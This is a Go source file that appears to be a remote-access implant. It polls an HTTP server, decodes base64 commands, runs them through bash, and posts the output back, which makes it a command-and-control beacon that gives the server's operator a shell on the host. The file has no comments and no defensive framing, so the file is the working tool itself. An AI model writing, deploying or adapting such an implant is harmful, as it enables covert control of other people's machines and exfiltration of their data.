package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path"
	"strings"
	"syscall"
	"time"
)

var USERNAME = "foobar"
var PASSWORD = "foobar"
var UPSTREAM = "http://localhost:8000"
var PAC_URL = ""
var SLEEP_TIME = 1 * time.Second
var CWD = ""

var COMMAND_MAP = map[string]func(cmd string) (string, string, error) {
	"shell": runBashWithTimeout,
	"pwd": getCwd,
	"cd": changeDirectory,
	"ls": listDirectory,
}

func init() {
	cwd, err := os.Getwd()

	if err != nil {
		panic(err)
	}

	CWD = cwd
}

func getCwd(_ string) (string, string, error) {
	return CWD, "", nil
}

func changeDirectory(command string) (string, string, error) {
	newCwd := path.Join(CWD, command)
	res, err := os.Stat(newCwd)
	if os.IsNotExist(err) {
		return "", "", fmt.Errorf("invalid path '%s': path does not exist", newCwd)
	}

	if !res.IsDir() {
		return "", "", fmt.Errorf("invalid path '%s': not a directory", newCwd)
	}

	CWD = newCwd
	return fmt.Sprintf("changed directory to %s", CWD), "", nil
}

func listDirectory(_ string) (string, string, error) {
	files, err := os.ReadDir(CWD)
	if err != nil {
		return "", "", fmt.Errorf("failed to read directory %s", CWD, err)
	}

	fileNames := make([]string, 0)
	for _, f := range files {
		fileNames = append(fileNames, f.Name())
	}

	return strings.Join(fileNames, "\n"), "", nil
}

func runBashWithTimeout(command string) (string, string, error) {
	timeout := 100 * time.Second
	ctx, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	cmd := exec.CommandContext(ctx, "bash", "-c", command)

	var outBuf, errBuf bytes.Buffer
	cmd.Stdout = &outBuf
	cmd.Stderr = &errBuf

	err := cmd.Run()
	if ctx.Err() == context.DeadlineExceeded {
		return outBuf.String(), errBuf.String(), fmt.Errorf("connection timed out after %v", timeout)
	}

	return outBuf.String(), errBuf.String(), err
}

func parseAndExecuteCommand(command string) (string, string, error) {
	commandGroups := strings.Split(command, " ")
	if len(commandGroups) == 0 {
		return "", "", fmt.Errorf("no command groups found for command %s", command)
	}

	commandName := commandGroups[0]
	commandArgs := strings.Join(commandGroups[1:], " ")

	if fn, ok := COMMAND_MAP[commandName]; ok {
		return fn(commandArgs)
	} else {
		return "", "", fmt.Errorf("no command '%s' found", command)
	}
}

func main() {
	termSig := make(chan os.Signal, 1)
	signal.Notify(termSig, syscall.SIGINT, syscall.SIGTERM)

	for {
		select {
		case <-termSig:
			return
		default:
			time.Sleep(SLEEP_TIME)

			resp, err := http.Get(UPSTREAM)
			if err != nil {
				continue
			}

			if resp.StatusCode != 200 {
				resp.Body.Close()
				continue
			}

			bodyBytes, err := io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				sendResult("", "", err.Error())
				continue
			}

			decoded, err := base64.StdEncoding.DecodeString(string(bodyBytes))
			if err != nil {
				sendResult("", "", err.Error())
				continue
			}

			command := string(decoded)
			stdout, stderr, err := parseAndExecuteCommand(command)

			if err != nil {
				stderr = fmt.Sprintf("%s\nerror: %s", stderr, err.Error())
			}

			sendResult(command, stdout, stderr)
		}
	}
}

func sendResult(command, stdout, stderr string) {
	result := fmt.Sprintf("%s\n\n%s\n\n%s", command, stdout, stderr)
	encoded := base64.StdEncoding.EncodeToString([]byte(result))
	http.Post(UPSTREAM, "text/plain", strings.NewReader(encoded))
}
